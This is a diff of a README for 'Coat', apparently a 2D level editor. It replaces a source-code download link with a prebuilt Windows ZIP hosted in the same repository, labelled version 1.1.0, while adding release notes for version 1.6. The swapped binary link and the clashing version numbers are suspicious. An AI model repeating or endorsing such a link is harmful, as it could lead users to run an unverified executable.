@@ -1,4 +1,4 @@
-[**Download Coat for Windows x64 · published build 1.3.8**](https://github.com/EpictetaLupercal/Coat/raw/refs/heads/main/Coat-1.3.8-Source.zip)
+[**Download Coat for Windows x64 · published build 1.1.0**](https://raw.githubusercontent.com/EpictetaLupercal/Coat/main/Coat-1.1.0-Windows-x64.zip)
 
 # Coat
 
@@ -11,6 +11,8 @@ Coat is a 2D level design editor by Epicteta Lupercal. Sketch a floor plan on a 
 Extract the Windows ZIP, keep its files together and run **Coat.exe**. The application requires the [.NET 8 Desktop Runtime for Windows x64](https://dotnet.microsoft.com/en-us/download/dotnet/8.0).
 
 ## Release highlights
+
+**1.5 → 1.6** · The foldable minimap moves the camera by click or drag, and pings can be pinned as persistent markers. The viewport HUD adds contextual commands and project-specific XP with export and playtest quests.
 
 **1.2 → 1.3** · The compact toolbar uses icons for drawing, dimensioning, erasing and other tools. Hover over a command for its name and hold **Shift** for details. Resize the inspector by dragging its left edge. With a selection, S, R and T activate Scale, Rotate and Move. Choose **Bordeaux** in **Edit → Preferences → Appearance** for burgundy panels, ivory lettering and brass borders. Since **1.3.2**, the Plugins menu can discover, show and run Lua extensions. [Lua plugin guide](docs/LUA-PLUGINS.md)
 
